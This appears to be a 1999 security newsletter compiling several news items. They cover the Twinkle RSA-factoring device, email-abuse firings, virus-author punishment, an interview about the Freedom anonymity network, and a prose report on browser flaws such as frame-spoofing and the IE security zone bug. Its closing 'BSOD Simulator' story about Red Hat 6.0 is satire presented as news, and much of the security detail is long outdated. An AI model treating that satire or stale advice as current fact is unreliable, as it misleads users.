       the main method for determining an RSA key. Twinkle stands for "The Weizmann Institute Key Locating Engine."
       Unlike the purely electronic design of the conventional computer, Twinkle is based on optoelectronics, which
       uses light to transmit digital information, similar to the way fiber-optic cables rely on light instead of 
       electrical impulses over copper wire to transmit signals. 
       
       Shamir estimates that the device would be as powerful as about 100 to 1,000 PCs in the factoring process. 
       
       Further, the machine could be easily built with little funding. While the DES Cracker cost US$250,000 to 
       construct, a Twinkle machine could be built for as little as $5,000, he said. 
       
       Bruce Schneier, president of cryptography firm Counterpane Systems said Shamir has come up with a very clever 
       approach to an academic problem.
       
       "This is brilliant, really brilliant stuff," Schneier said. "Once you read the paper it's extremely obvious. 
       There's a lot of engineering between the paper and reality. But it's certainly doable. Nothing [in the design]
       is insurmountable." 
       
       The significance of Twinkle is mathematical, rather than a political statement about encryption, Schneier said. 
       "This is academic research." 
       
       Encryption expert Matt Blaze, an encryption researcher at AT&T Labs, said Twinkle doesn't change the theoretical
       strength of the RSA encryption algorithm. But "if Twinkle's approach turns out to be practical it will force us
       to reconsider the appropriate minimum length of RSA keys." 
       
       Blaze does see potential political repercussions from Shamir's advance. "If Twinkle is practical, it would
       provide a similar demonstration of the weakness of the public key systems allowed for export." 
       
       Will anyone seek to build a machine based on Twinkle? No doubt, Schneier said. "If you were a government and your
       business is learning what other
       governments are saying, you'd be a fool not to build this machine. I'm sure the [National Security Agency] is 
       studying it very carefully."

       25 FIRED BECAUSE OF E-MAIL ABUSE
       by BHZ, Saturday 8th May 1999 on 2:39 pm CET
       About 25 employees who used electronic mail for non-business reasons have been
       fired at Edward Jones, successfully brokerage firm. Spokeswoman from the firm didn't
       share information about what did they actually do, but she said: "It is not acceptable
       to use the Internet for nonbusiness-related purposes. Read the article below

      Brokerage firm here fires 25 for e-mail abuse
      By Paul Hampel 
      Of the Post-Dispatch

        About 25 employees who used electronic mail for non-business reasons have been fired at Edward Jones, a
      spokeswoman for the brokerage firm said Thursday.

      Besides last week's firings, another 48 employees were suspended, said one employee, who asked not to be
      identified.

      "When people get Internet access at Edward Jones, they know the policy of the firm," said Mary Beth Heying, a
      spokeswoman for the company. "It is not acceptable to use the Internet for nonbusiness-related purposes."

      She refused to say specifically why the employees were disciplined, what the company's e-mail policies are and
      how the disciplined employees had violated them. Several employees who spoke anonymously said they
      understood that some of the infractions involved off-color jokes.

      "E-mail goes through the Internet," Heying said. "So, generally speaking, we're talking about people whose
      employment was terminated for Internet abuse." 

      The company, which has its headquarters here, issued a memo on April 27 that instructed employees who had
      sent e-mails containing pornography or off-color jokes to report to the personnel office by April 29, one
      employee said. 

      Like all the Edward Jones employees interviewed for this story, the employee asked that his name not be used.
      The day after the memo was circulated, the personnel department was jammed with people wondering if they
      had violated the policy, said the employee. 

      "Nothing got done last week at Edward Jones," he said. "Everyone was freaked out." 

      Heying issued a statement on behalf of the company that said: 

      "We at Edward Jones have zero tolerance with regard to Internet abuse. This policy has been clearly
      communicated to our associates. 

      "Although we cannot comment on specific situations, we have a responsibility to provide our nearly 14,000
      associates a workplace free from Internet abuse." 

      Heying said the firings were confined to the 2,300 employees distributed among the three campuses that make
      up the company's international headquarters. They're located in Maryland Heights, in Maryville Center in West
      County and in Des Peres. 

      The brokerage firm - which Heying said was the world's ninth largest - also operates 5,000 branch offices
      across the country, as well as in Canada and the United Kingdom. The firings did not affect the branches, she
      said. 

      Employees interviewed Thursday afternoon on the parking lot at the Maryland Heights campus at 201 Progress
      Parkway said rumors were circulating that the number of people fired was higher than Heying's estimate. 

      Some saw a rainbow in the firings. "This is awful to say, but the firing could actually be good news for me," said
      one young employee. "It could mean I'll move up in this company." 

      Another employee, a woman, said she had heard that some of those fired had been sending dirty jokes to one
      another. 

      "All the big companies seem to be firing people for sending dirty e-mails," she said. " It's happened the last two
      or three places I've worked." 

      A former Edward Jones employee, who left to pursue other business interests, said the company zealously
      monitored employee communications. 

      "Edward Jones is the most technologically advanced firm I've ever seen," said the man. "They monitor
      telephone calls and e-mails. They are able to track everything."

 48.0  Punishment CIH vs MELISSA
       ~~~~~~~~~~~~~~~~~~~~~~~~~
       
       From http://www.net-security.org/
       
       PUNISHMENT
       by BHZ, Saturday 8th May 1999 on 2:33 pm CET
       SF Gate published an article about two actual virus cases: David Smith's (Melissa
       creator) and Chen Ing-hau's (CIH creator). They do some parallels between them, and
       from it some strange things could be seen. CIH virus was more destructive (because
       it deletes all data), but its creator was just suspended from his university. David
       Smith could get up to 40 years of imprisonment. Read the article below;
       
       http://www.sfgate.com/technology/expound/
       
      Stopping The Deadly Virus 
      Punishment won't cure this ill 
      Neil McAllister, Special to SF Gate 


      Perhaps the only thing more frustrating than the damage caused by viruses is the realization that one
      has very little recourse when they do strike. 

      They're a hit-and-run by an unknown assailant. 

      No wonder Melissa virus creator David Smith's arrest and pending trial is viewed by many with
      such pernicious glee. For once, it seems, one of these faceless delinquents will be brought to justice,
      and get what he deserves. 

      Compare Smith's case with that of Taiwanese information engineer Chen Ing-hau. Taipei
      authorities recently fingered the 24-year-old man as responsible for the highly damaging CIH, or
      "Chernobyl" virus -- so named because it strikes on anniversaries of the April 26, 1986 Soviet nuclear
      disaster. Chernobyl's last outbreak erased data on tens of thousands of computers worldwide,
      rendering many unusable. 

      But while David Smith could potentially land more prison time than some repeat rapists, the only
      punishment Ing-hau has received to date for his role in creating the virus has been a demerit from the
      Tatung Institute for Technology, where he studied computer science. That was over a year ago. 

      Unlike Melissa, it seems Chernobyl's victims have very little hope of restitution for data lost to the
      virus. So while there may be an opportunity to finally make an example of David Smith, I question
      whether slapping a programmer with a 40-year sentence will really contribute much to ending the
      threat of malicious software. Before we go blindly locking away virus authors, maybe we should first
      examine their motives. 

      First an admission: David Smith and I have something in common. Perhaps my life of crime
      eventually might have landed me in the same spot in which Smith now finds himself -- had I maybe been
      just a little bit better at it. 

      Melissa wreaked havoc on networks nationwide in March, using a combination of Microsoft's Word
      and Outlook software for Windows to spread copies of itself rapidly across the Internet, via email.
      The resulting flood of messages soon choked afflicted mail servers, rendering them incapable of
      processing genuine email as they struggled beneath the load of Melissa-generated mail. It was the first
      big virus outbreak of 1999. 

      My own career in computer virus authoring ended years ago, before there was much of an Internet,
      and when MS-DOS was the PC operating system of choice. Dubbed Leprosy-B, my last (and
      somewhat ineffectual) virus was the follow-up to a similarly timid program I'd written earlier, called
      (predictably enough) Leprosy. 

      About 10 minutes after putting the finishing touches on Leprosy-B, I accidentally let it loose on my own
      hard drive. It promptly infected half my development tools and a random number of system
      files, before I could get it in check. As I embarked on a long night of re-installing infected software, I
      got my first real taste of what a royal pain in the ass computer viruses can be. 

      As a teenager, crippling entire computer networks worldwide was the farthest thing from my mind as I
      toiled late nights writing the Leprosy virus. For one thing, I just wasn't skilled enough a programmer to
      pull off such a feat -- but it was a lot easier to write a tiny virus program than a huge application, like a
      word processor. 

      Today, even complete novices can create their own computer virus with the help of one of the several
      "virus construction kits" available for download from some hacker sites on the 'Net. Most virus
      software, in fact, remains no great wonder, relying on a small number of instructions to achieve a few
      clever tricks. It's generally a fluke when one manages to travel as widely and achieve its goal as
      successfully as Chernobyl or Melissa. 

      While some virus outbreaks might accurately be categorized as industrial espionage, most virus
      authors seek little more for their efforts than a certain kind of notoriety within the computing
      underground. Getting your virus out into public circulation is a little like spray painting your name
      on walls: It's a way to gain recognition amongst your peers. But while most graffiti taggers might
      hesitate before defacing the ceiling of the Sistine Chapel, viruses generally make no distinction about
      which systems they destroy. 

      Since most virus attacks tend to be executed with all the cunning of throwing eggs at a passing car,
      maybe the solution lies elsewhere besides prosecuting the authors of these tiny terrors. Maybe
      it's time we addressed the issue of what makes viral software possible to begin with. 

      As the number of computer viruses has grown over the years, a cottage industry of anti-virus software
      has appeared to combat the problem. We regularly hear about anti-virus software causing various
      crashes and conflicts with other programs. None of these packages, however, does very much to strike
      at the root cause of computer viruses -- the vulnerability of the operating system itself. 

      Sun Microsystems had the right idea with the "sandbox" security model of its Java language. Java
      applets downloaded from an untrusted source on the Web aren't allowed access to most of the OS
      features that would allow a virus to spread. Sun realized that the creation of a globally networked
      computer environment meant new security measures had to be developed to protect users
      from all their new neighbors. It's an idea as simple as installing a deadbolt on your front door. 

      Contrast Sun's ideas to Microsoft's, whose decision to build a complete programming language
      into its word processor without any significant security measures spawned an entire new
      subcategory of Macro Viruses -- now one of the most commonplace forms of viruses encountered.
      Melissa itself fell into this category. Further, Microsoft's ActiveX technology for the Web can
      allow viral code to run virtually unchecked on a Windows computer directly over the network. 

      I'm not about to say David Smith shouldn't be held responsible for damages caused by Melissa should
      he be found guilty of creating and releasing that virus. But I also feel it's the responsibility of
      software manufacturers to adapt to the vulnerabilities of today's networked computing
      model by creating secure software environments for us to work in. The technology exists; it's only a
      matter of making an effort to deploy it. 

      Try asking your operating system vendor sometime what steps they're taking to protect you from attack
      by hostile software. If the answer you get is that they're helping to prosecute David Smith, don't buy
      it. 

      Today there are hundreds of David Smiths worldwide, and a new David Smith is born every
      day. There's only one Microsoft. Can't they do any better than to point the finger?

       WORLD OF FREEDOM IS COMING
       by BHZ, Friday 7th May 1999 on 3:23 pm CET
       Privacy. The word which is often in the news. Is Big Brother watching? Well if he is,
       then he is finished. New program, called Freedom will change it all. It will base on
       new Freedom network (world's ISPs join forces on this matter). Read here on HNS,
       exclusive interview with Jordan Socran from Zero-Knowledge Systems, company
       behind Freedom. See how will you be able to surf, chat and use e-mail 100%
       anonymously. So read the interview in our Special Report.
       
       Special Report;
       
       http://www.net-security.org/spec/zks/index.htm
       
       If you may know, because many news sites wrote about Freedom, this new program
       will secure us in the future. What is Freedom? How will it work? Why the company
       has been "attacked" by Intel? Find the answers in exclusive interview with
       Jordan Socran, manager of partnership programs for ZKS.
                   
       With Freedom to 21st century
      
       <BHZ> ZKS is a famous company now, when was it founded and with what plans?
      
       <ZKS> ZKS is founded in 1997 to provide Net users with a way to protect their
       privacy online. Plans are to offer users the ability to set up and manage multiple
       digital identities that they can use online. This way they can enjoy all the benefits of
       the Net without sacrificing their privacy. We wanted to let people enjoy the privacy
       they have in the physical world on the Internet. Freedom is the way they can.
      
       <BHZ> Freedom is first project created by ZKS?
      
       <ZKS> Yes. We are scheduled to release the beta later this month and Freedom 1.0
       later this summer. Freedom is the only thing we are working on since ZKS was
       started. In the future, we plan on releasing Freedom for kids, to protect children online
       as well as a version of Freedom that can be used on an Intranet, i.e. behind a firewall.
       This current version is for personal use only.
      
       <BHZ> On what basis Freedom works?
      
       <ZKS> We invented a technology we are calling PIP - Privacy Enhanced Internet
       Protocol. We looked at all the current remailing technologies, etc, including
       onion-routing, Penet.fi and many others. We have figured out a way to go beyond
       these systems to maximize the efficiency of anonymous re-routing and strong crypto.
       Freedom removes identifying information, encrypts data packets multiple times and
       routes them through a series of Freedom Servers, hosted by ISP's around the world.
      
       <BHZ> You made big marketing for Freedom, many sites have Freedom buttons for
       several months...
      
       <ZKS> We have actually done very little marketing. We have not spent any money
       promoting Freedom. We have received a lot of press due to the nature of our product
       and people all over the world have communicated with one another without ZKS
       intervention.
      
       <ZKS> The sites of people with buttons - these people have found us :)
      
       <BHZ> But you have affiliates, which can earn money if visitors from their site buy a
       copy of freedom?
      
       <ZKS> Yes. we now have over 1000 ! :) The difference is that these people believe in
       the cause, not just the money. We want to give the power back to the people, that is
       why we say that Freedom empowers . We want to make a change.
      
       <ZKS> We are NOT just out to make $$$
      
       <BHZ> Well to people privacy is very important. On your opinion, will Freedom
       become the best and most famous of all security solutions?
      
       <ZKS> Maybe, maybe not - the people will decide. We will release Freedom for the
       people that need it most. The people in Human Right organizations, people in
       countries where the gov't doesn't let them enjoy the Internet, people who wish to be
       private on the Net. We hope other companies will begin to offer solutions as well that
       help the people do this. Will Freedom be the most secure? We will see. It is a
       dangerous thing to offer partial security...
      
       <BHZ> On what operating systems will Freedom run?
      
       <ZKS> This version is for Windows only. We will be looking at other platforms as
       soon as we release to port the client to - i.e. Linux, Mac, etc. We hope to one day go
       open source...
      
        
      
       Freedom network
      
       <BHZ> So when someone buys Freedom, how is the program reacting to hide the
       real identity of the customer?
      
       <ZKS> We use a double-blind registration process. the download is free. You can
       download Freedom as many times as you wish - at home, at work, etc. You then go
       online to buy tokens. Each token can be redeemed to activate one pseudonym (nym)
       on the Freedom Network for a 12 month period. The token is just a serial number. We
       have created a pool of millions of tokens. When you buy a token, you pull it out of the
       token pool. We do not know which token you received. Our server checks to see if it
       is a valid token but we don't know who received the token.
      
       <BHZ> So client with installed Freedom program connects to Freedom network. It is
       all crypted... So how fast is it then?
      
       <ZKS> We have overcome many of the slowdowns that using strong crypto would
       bring. Users in North America will not notice a slowdown. In Europe, it will depend on
       where you are and how many ISP's are running Freedom Servers in your area. Where
       the Internet backbone is strong, Freedom will be faster.
      
       <BHZ> So how many ISPs are connected into Freedom network?
      
       <ZKS> Right now 50 ISP's on 4 continents - Australia, Austria, Canada, Japan,
       Netherlands, UK and the United States
      
       <BHZ> And what are the plans, to enlarge your network?
      
       <ZKS> We are promoting the Freedom Server program by advertising to ISP's, online,
       at conferences, etc. Many ISP's have heard about it and are contacting us. Since we
       announced the Freedom Network, we have received _many requests from ISP's
       around the world (many in Europe) about joining the network. It will grow as people
       hear about and begin using - Freedom
      
       <BHZ> How big is the team behind Freedom?
      
       <ZKS> We are 35 people here at Zero-Knowledge, including Ian Goldberg (Ian
       cracked the 40 bit DES code in the RSA Data Security challenge in 3.5 hours. He
       also cracked the GSM Cellular phone standard and the Netscape SSL). k
      
       <BHZ> Very impressive... He is very useful in Freedom project
      
       <ZKS> Yes, he is helping a lot with security. He is one of the "WiReD 25" the 25
       people Wired Magazine listed as most likely to influence the future of the Internet.
      
        
      
       Pentium Serial Number (PSN) exploit
      
       <BHZ> So as you work on privacy, you found a way to read PSN (Pentium Serial
       Numbers) from computer with Pentium III chip?
      
       <ZKS> Yes. We realized that the software fix Intel issued to turn off the identifier,
       was easily compromised
      
       <BHZ> And you released public script that exploits that "turn off" function on PIII
       running computers?
      
       <ZKS> No. The script is not public. We posted a demonstration on our site that
       shows you that the identifier is not secured by the Intel patch, plus we digitally signed
       the demonstration so that people would know it was just ZKS demonstrating.
      
       <BHZ> It uses active X controls?
      
       <ZKS> It was written in ActiveX, yes.
      
       <BHZ> How were reactions from the public?
      
       <ZKS> We got tremendous support from the public for exposing the flaw. 
      
       <BHZ> Ok so public reacted in positive way, but you had some problems with Intel?
      
       <ZKS> Yes, Intel asked Symantec to label the demonstration as a malicious virus,
       and they did. This brought even more support and led to the current controversy.
      
       <BHZ> Were you contacted by Intel directly?
      
       <ZKS> We had originally contacted them to tell them about the problem with the chip
       and ways to resolve them. We hoped that Intel would act to address these very
       serious privacy concerns...
      
       <BHZ> And then they "attacked" your exploit saying that it is malicious...
      
       <ZKS> Yes.
      
       <BHZ> So what is the current situation between ZKS and Intel?
      
       <ZKS> We are still trying to discuss this with Intel and we hope they will be
       responsive... but as of now, they don't seem ready to address the issue
      
       <BHZ> Well public is on your side, even hackers are on your side... Just to note that
       www.freedom.edu was hacked earlier today stating "sad but true, freedom is an
       illusion" and they told their opinions on Intel-ZKS situation.
      
       <ZKS> Is it? ;) The Freedom we're releasing will not be an illusion. We are thankful to
       have the hacker community on our side, helping us to evaluate the software and
       offering their suggestions in increasing its security, if need be.

 51.0  The New Generation of Browsers
       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       
       NEW GENERATION BROWSERS
       by BHZ, Thursday 6th May 1999 on 11:55 am CET
       Our new special report, written by Thejian, is called New Generation Browsers: Are
       they worth the fuzz? So you could guess, he speaks about different aspects of
       new-wave browsers and lists the common bugs in them. Read the Special Report
       below;
       
       The New Generation Browsers: Are they worth the fuzz?

       The general public is becoming more and more security- and, even
       more so, privacy-concious. Finally the realization that there's no
       real legitimate reason for things as the MS GUID (global unique
       identifier, a "feature" of the Microsoft Office package wich lets
       the apps MS Word and MS Excel add an id-tag to every created
       document wich makes it possible to trace this back to its original
       creator). Because of this it's not that awkward to hear the major
       browser-developers make claims about their browsers capabillities
       in this field. But are these claims justified? Previous versions
       of the Netscape and Opera browsers contained some serious flaws,
       not to mention the huge breach of security Microsofts Internet
       Explorer was. The purpose of this document is to explore various
       major flaws in the "new generation browsers" to provide the general 
       public with the means to make a good comparison. Naturally the 
       manufacturers of these new browsers will do everything to assure 
       the public they got it right this time, this document will try to 
       figure out how close to the truth these claims really are.
       
       The problems:
       
       1. Frame-spoofing
       
       The frame-spoofing exploit allows Web sites to insert its own frames
       into a third-party site in the window of a surfer who visits both
       sites. The risk here is that an unsuspecting user who might be
       submitting credit card or private information to a trusted site
       unknowingly leaks this info to a third party. Since the discovery of
       this hole several variations (like the "window-spoofing" instead of
       "frame-spoofing" exploit).
       
       This bug has plagued all the major browsers. The problem is that these
       browsers allow the manipulation of frames across domains. This hole was
       announced patched by restricting the writing of frames to a single domain.
       Opera went even as far as to restrict this to pages originating from the
       same server.
       
       2. "Caching"
       
       This bug allows the webmaster of a malicious site to view the contents of
       a users cache by utilization of Javascript. In a twist on this, it has also
       been proven possible by Juan Carlos Cuartango to read the contents of an
       users clipboard among other things. Since most users are relying heavily
       on "cut/paste"-functions this of course should also be considered a major
       security-/privacy-hole. This one also was announced patched.
       
       But..
       
       But guess what? The new Microsoft Internet Explorer 5 still allows the
       frame-spoofing and reading of local files as described by G. Guninski
       (http://www.whitehats.com/guninski/read.html) on the Bugtraq mailinglist. 
       And yes, Netscapes new baby is still vulnerable too. 
       
       Another bug, known as the security zone bug, in IE 4 and 5 (by connecting 
       to http://3475932041 the browsers surfs to the MS Web site, because Winsock 
       translates the URL as an existing IP. Problem here is that the browser figures 
       the site is within the "trusted local intranetzone" and because of this 
       automatically submits usernames and passwords without asking for confirmation 
       by the user) is partially fixed but this one can also still in some way or another 
       be exploited. Opera did a pretty decent job at plugging the spoofing-hole, but 
       that company recently discovered it still is possible to make a browser try and 
       open up a fake frame, but in the process using the wrong adress. Patches for this 
       problem are expected to keep the browser from opening the frame at all, but hey,
       there hasn't really been lived up to those expectations recently has there? 
       
       The new versions of these browsers even have some nice new "features":
       
       - Microsofts Internet Explorer 5 now contains a so-called Auto-Complete function.
       When users begin typing in a URL, IE will suggest possible matches from sites 
       they have recently visited. This can save a user from having to type out long URLs. 
       It can also help people find sites they visited but did not bookmark. Problem is
       though, that this feature also applies to online forms. Because of this data like
       username/password combinations are remembered by the browser. Nice feature
       when you're on a shared computer eh? Advised is to turn the Auto-Complete function
       off. 
       
       - Another nice feature of the Internet Explorer 5 is that is notifies Web sites when
       they get bookmarked by the user. This was an intended feature, it's supposed to help
       webdesigners "brand" a users bookmarks. This feature enables in short a Web site to
       put a logo up next to the corresponding bookmark (called "Favorites" in Internet
       Explorer). The browser requests a file called favicon.ico to put the image in that
       file next to the bookmark. While developing this function Microsoft obviously didn't
       think (or just plainly ignored) the privacy of their users. A site could hypothetically 
       use the feature to build a log of a user's bookmarked pages. Visitors could be tracked 
       anonymously, by a cookie, or by name, if they registered at the site.
       
       - Netscape has thought of something nice too. Netscape's (4.5) what's related 
       function connects to the rl.ld1.netscape.com site at random. For every 5 sites 
       you visit 1 connection is made to their server. This is probably to keep some 
       stats or something, but I actually enjoy having some privacy so you might want 
       to turn "what's related" off too.
       
       As you've probably gathered from the above, the main problem with the "new generation
       browsers" (as was with their predecessors) lies within the implementation of scripting
       languages. This got illustrated this week by the alert that the so-called "anonymizing"-
       services like Anonimyzer, Onion Router, Lucent Personalized Web Assistant and AIX Privacy
       (wich are supposed to provide their users with stealth browsing without showing any
       information about the users to the visited Web sites) allow sites to simply turn the
       anonymizing-function off by using a Javascript redirect-tag. As was noted in response
       to this alert, this is not a fault by the involved online services, but more one on the
       users side. 
       
       If your privacy is truly dear to you, the best thing to do probably is turning
       off the Javascript, Java and AxtiveX functions in your browser. It seems that browser-
       manufacturers are just not ready for the use of those functions yet. It might get a tad
       less colourful and sparkling on the Net, but hey, privacy isn't that bad either eh?

       BSOD Simulator
       May 4, 1999
       
       Users of Red Hat 6.0 are discovering a new feature that
       hasn't been widely advertised: a Blue Screen of Death
       simulator.  By default, the bsodsim program activates when
       the user hits the virtually unused SysRq key (this is
       customizable), causing the system to switch to a character
       cell console to display a ficticious Blue Screen.
       
       Red Hat hails the bsodsim program as the "boss key" for the
       Linux world.  "Many old DOS games had a boss key, which
       caused the program to switch to a DOS shell or a benign
       looking screenshot when the boss walked by," a Red Hat
       engineer explained.  "This allowed unscrupulous workers to
       play games without the knowledge of the PHB.  With
       multitasking, this isn't necessary anymore."
       
       He continued, "However, a new 'boss problem' has emerged.
       Workers are smuggling Linux boxes into companies that
       exclusively use Windows.  This is all good and well until
       the PHB walks by and comments, 'That doesn't look like
       Windows...'  With bsodsim, that problem is solved.  The
       worker can hit the emergency SysRq key, and the system will
       behave just like Windows..."
       
       The bsodsim program doesn't stop at just showing a
       simulated error message.  If the boss doesn't walk away,
       the worker can continue the illusion by hitting
       CTRL-ALT-DEL, which causes a simulated reboot.  After
       showing the usual boot messages, bsodsim will run a
       simulated SCANDISK program indefinitely.  The boss won't be
       able to tell the difference.  If the boss continues to hang
       around, the worker can say, "SCANDISK is really taking a
       long time... maybe we should upgrade our computers.  And
       don't you have something better to do than watch this
       computer reboot for the tenth time today?"
       
       Red Hat 6.0 also includes a 'Flying Windows' screensaver
       for use with X Windows.  If the boss happens to walk by
       your computer when you're away, he still won't be able to
       tell that it's not running Windows.
